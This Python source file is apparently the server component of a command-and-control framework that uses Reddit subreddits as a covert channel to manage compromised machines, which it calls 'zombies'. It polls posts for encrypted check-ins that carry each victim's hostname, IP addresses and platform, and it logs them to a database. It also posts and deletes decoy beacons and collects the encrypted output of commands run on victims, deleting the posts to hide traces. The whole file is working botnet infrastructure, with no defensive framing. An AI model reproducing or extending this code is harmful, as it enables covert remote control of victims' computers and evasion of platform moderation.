#!/usr/bin/env python3

import praw
import random
import time
import hashlib
import base64
from multiprocessing import Process
from datetime import datetime

import ui
import engine
import zombie
import globals
import database

class master_account:

	def __init__(self, user, passwd, secret_key, client_id):

		self.user = user
		self.passwd = passwd
		self.secret_key = secret_key
		self.client_id = client_id
		self.user_agent = engine.buildRandom(random.randint(20,35))


	def buildRedditObj(self):

		obj = praw.Reddit(	client_id = self.client_id,
							client_secret = self.secret_key,
							password = self.passwd,
							username = self.user,
							user_agent = self.user_agent
				         )
		return obj


class channel:

	def __init__(self, subreddit, account):
		
		self.subreddit = subreddit
		self.account = account
		self.zombieHandles = {}


	def clearChannel(self):
		print(f"{ui.notif_yellow()} Clearing the {ui.WHITE_B}{self.subreddit}{ui.RESET} channel . . .")
		for submission in (self.account.buildRedditObj().subreddit(self.subreddit)).new(limit=100):
			submission.mod.remove()

	def runProbe(self):
		
		while True:

			for submission in (self.account.buildRedditObj().subreddit(self.subreddit)).new(limit=500):
				
				if submission.title.split(":")[1] == globals.ALIVE_ID:

					zid = submission.title.split(":")[0]

					if zid not in self.zombieHandles.keys():

						implant_id = submission.title.split(":")[2]
						implant_key = database.getImplantKeyByID(implant_id)
						if not implant_key:
								print(f"\n{ui.notif_yellow()} Zombie {ui.WHITE_B}{zid}{ui.RESET} has attempted a check in with a non-existent implant ID.\n{ui.notif_yellow()} This is normal behavior, and a valid callback should come soon . . .")	
						else:	
							aes_key = engine.getSessionKey(implant_key, submission.selftext)
							dat = ":".join(submission.selftext.split(":")[1:])
							try:
								aliveData = engine.decrypt(aes_key, dat)
								add = {}

								for entry in aliveData.split(","):
									key = entry.split(":")[0]
									val = entry.split(":")[1]
									add[key] = val
									timestamp = datetime.now()

								sub = submission.subreddit.display_name
								# def __init__(self, channel, associated_account, zid, aes_key, hostname, priv_ip, pub_ip, platform, first_check, last_check):
								zomb_init = zombie.zombie(sub, add["ACC"], zid, aes_key, implant_id, add["HST"], add["iIP"], add["oIP"], add["PLTFRM"], timestamp, timestamp)
								self.zombieHandles[zid] = zomb_init
								database.pushZombieToDb(self.zombieHandles[zid])
								print(f"\n{ui.notif_green()} Zombie {ui.WHITE_B}{zid}{ui.RESET} has checked in ({zomb_init.pub_ip}).", end="")

							except UnicodeDecodeError:
								print(f"\n{ui.notif_yellow()} Zombie {ui.WHITE_B}{zid}{ui.RESET} has attempted a check in with a bogus encryption key.\n{ui.notif_yellow()} This is normal behavior, and a valid callback from this zombie should come soon . . .")


					else:
						self.zombieHandles[zid].updateLastCheck()


					submission.mod.remove()

						
			time.sleep(random.randint(3,6))
	


	def reverseBeacon(self):
		
		while True:

			titleString = engine.generateBogusID() + ":" + globals.SERVER_BEACON_ID + ":" + engine.buildRandom(13)
			verCode = hashlib.sha224(bytes(globals.CHANNEL_VERIFY, 'utf-8')).hexdigest()
			embedVerCode = base64.b64encode(bytes(verCode + engine.buildRandom(random.randint(80,100)), "utf-8")).decode("utf-8")
			fakeData = engine.encrypt(engine.buildRandom(32), engine.buildRandom(random.randint(30,50)))
			sendDat = fakeData.split(":")[0] + ":" + fakeData.split(":")[1] + ":" + embedVerCode 
			serv_beacon = (self.account.buildRedditObj().subreddit(self.subreddit)).submit(titleString, selftext=sendDat)
			time.sleep(random.randint(5,10))
			serv_beacon.delete()

	def catchCommandResponse(self, submission_id, cmd_id, zombie):
		
		cycle = 0
		while cycle < 5:
			submission = (self.account.buildRedditObj()).submission(id = submission_id)
			if len(submission.comments) > 0:
				try:
					resp = ":".join(submission.comments[0].body.split(":")[1:])
					rawDat = engine.decrypt(zombie.aes_key, resp)
					zid = rawDat.split(":::::")[0]
					sent_cmd_id = rawDat.split(":::::")[1]
					cmdout = rawDat.split(":::::")[2]
					if zid == zombie.zid and sent_cmd_id == cmd_id:
						if cmdout == "NOOUT":
							print(f"\n{ui.notif_green()} Command {ui.WHITE_B}{cmd_id}{ui.RESET} has been successfully executed, however no output was returned.")
						elif cmdout == "TOOLONG":
							print(f"\n{ui.notif_yellow()} Command {ui.WHITE_B}{cmd_id}{ui.RESET} was successfully executed, however the returned output was too long to process.")
						else:
							print(f"\n{ui.notif_green()} Command {ui.WHITE_B}{cmd_id}{ui.RESET} output:\n{cmdout}")

					submission.delete()
					return 0
				except:
					print(f"\n{ui.RED_MINUS} Error processing command {ui.WHITE_B}{cmd_id}{ui.RESET} response.")
					submission.delete()
					return 1
			cycle += 1
			
			time.sleep(12)

		submission.delete()
		print(f"\n{ui.RED_MINUS} No response has been received for command {ui.WHITE_B}{cmd_id}{ui.RESET}. This could potentially mean an issue has occurred with the payload.")
		return 1
			
